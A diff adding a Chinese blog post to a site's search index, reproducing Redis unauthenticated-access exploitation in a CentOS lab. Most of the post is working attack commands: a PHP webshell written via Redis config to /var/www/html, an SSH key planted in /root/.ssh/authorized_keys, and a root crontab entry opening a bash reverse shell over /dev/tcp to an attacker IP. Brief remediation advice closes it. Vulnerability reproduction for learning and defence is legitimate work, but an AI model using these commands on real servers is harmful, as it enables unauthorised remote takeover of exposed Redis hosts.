@@ -222,6 +222,57 @@
       </tags>
   </entry>
   <entry>
+    <title>redis 未授权访问漏洞利用</title>
+    <url>/2023/05/15/redis/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
+</div>
+
+<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-15</p>
+</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Redis 在某些情况下，绑定在0.0.0.0 暴露公网访问的时候，没有防火墙策略，没有密码认证的情况下，会导致任意目标访问 redis 以及读取写入数据。</p>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
+<li>绑定在 0.0.0.0:6379，没有安全策略ip限制，直接暴露在公网</li>
+<li>没有设置 redis 密码认证，可以免密码登陆</li>
+<li>高级利用，root 身份运行</li>
+</ul>
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
+<li>centos 7</li>
+<li>redis <code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis</span><br><span class="line">make</span><br><span class="line">make install 将redis-cli redis-server 安装到/usr/bin</span><br><span class="line"><span class="built_in">cp</span> redis.conf /etc</span><br><span class="line">修改redis.conf 配置文件 <span class="built_in">bind</span> 0.0.0.0,关闭密码认证，关闭服务器防火墙</span><br><span class="line">root启动</span><br></pre></td></tr></table></figure>
+
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装 redis-cli</span><br><span class="line">yay -S redis</span><br><span class="line">redis-cli -h 192.168.56.110  连接redis</span><br><span class="line"></span><br><span class="line">**数据泄漏**</span><br><span class="line">keys *   获取所有 keys 值</span><br><span class="line"></span><br><span class="line">**系统信息**</span><br><span class="line">info    获取系统信息，redis版本，系统信息等</span><br><span class="line"></span><br><span class="line">**webshell**</span><br><span class="line"><span class="comment"># 写入一个string内容</span></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n&lt;?=`<span class="variable">$_GET</span>[0]`?&gt;\n\n&quot;</span>    \n换行，防止写入数据混乱</span><br><span class="line"><span class="comment"># 设置备份目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置备份文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 保存文件到本地</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入 SSH 公钥登陆无密码登陆目标系统**</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa　　//执行生成key命令</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份文件目录设置为对应的 .ssh，一般默认为 /root/.ssh/</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> key <span class="string">&quot;\n\n\生成的公钥n\n&quot;</span></span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入计划任务 crontab 运行命令，获取shell**</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.110.141/4789 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>修复方式</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></h1><ul>
+<li>bind 127.0.0.1  只对本地开放</li>
+<li>requirepass password  设置密码认证</li>
+<li>修改默认端口</li>
+<li>设置防火墙规则</li>
+</ul>
+</div></div></div>
+
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>未授权访问</category>
+        <category>redis</category>
+        <category>未授权访问</category>
+      </categories>
+      <tags>
+        <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于作者</title>
     <url>/about/index.html</url>
     <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-brands fa-redhat"></i><p>个人简介</p>
